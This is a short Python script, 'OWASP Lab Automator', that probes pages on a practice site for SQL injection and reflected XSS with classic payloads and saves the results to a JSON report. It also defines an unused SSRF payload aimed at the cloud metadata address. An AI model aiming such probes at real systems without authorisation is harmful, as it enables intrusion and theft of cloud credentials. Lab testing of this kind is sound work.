#!/usr/bin/env python3
import requests, argparse, json
from urllib.parse import urljoin

TARGETS = ["http://testphp.vulnweb.com/artists.php", "http://testphp.vulnweb.com/listproducts.php"]
PAYLOADS = {"sqli": "' OR '1'='1", "xss": "<script>alert(1)</script>", "ssrf": "http://169.254.169.254/"}

def test_sqli(url):
    try:
        r = requests.get(f"{url}?artist={PAYLOADS['sqli']}", timeout=5)
        return "error" in r.text.lower() or "mysql" in r.text.lower()
    except: return False

def test_xss(url):
    try:
        r = requests.get(f"{url}?search={PAYLOADS['xss']}", timeout=5)
        return PAYLOADS['xss'] in r.text
    except: return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="OWASP Lab Automator")
    parser.add_argument("--target", default=TARGETS[0])
    args = parser.parse_args()
    results = {"target": args.target, "sqli": test_sqli(args.target), "xss": test_xss(args.target)}
    print(json.dumps(results, indent=2))
    with open("report.json","w") as f: json.dump(results,f,indent=2)
